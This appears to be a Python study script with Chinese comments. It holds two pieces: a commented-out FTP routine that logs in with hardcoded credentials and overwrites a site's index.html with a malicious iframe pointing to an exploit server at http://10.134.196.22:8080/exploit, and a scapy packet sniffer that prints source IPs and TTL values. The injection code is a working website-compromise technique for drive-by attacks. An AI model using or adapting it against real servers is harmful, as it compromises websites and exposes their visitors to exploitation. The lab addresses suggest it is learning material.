# -*- coding: utf-8 -*-
"""
Created on Thu Jul 11 08:24:19 2019

@author: Administrator
"""
'''
import ftplib
def injectPage(ftp,page,redirect):
    f=open(page+'.tmp','w')
    print('[+] Downloaded Page: '+page )
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: '+page)
    ftp.storlines('STOR '+page,open(page+'.tmp'))#这里之前'stor忘记加空格了,需注意
    print('[+] Uploaded Injected Page: '+page)
host='10.134.196.21'
userName='test01'
passWord='1'
ftp=ftplib.FTP(host)
ftp.login(userName,passWord)
redirect='<iframe src='+'"http://10.134.196.22:8080/exploit"><iframe>'
injectPage(ftp,'index.html',redirect)

'''


############################


#使用scapy解析ttl字段
from scapy.all import *
def testTTL(pkt):
    try:
        if pkt.haslayer(IP):
            ipsrc=pkt.getlayer(IP).src
            ttl=str(pkt.ttl)
            print('[+] Pkt Received From: '+ipsrc+' with TTL: '+ttl)
            

    
    except:
        pass
def main():
    scapy.sniff(prn=testTTL,store=0)

if __name__=='__main__':
    main()




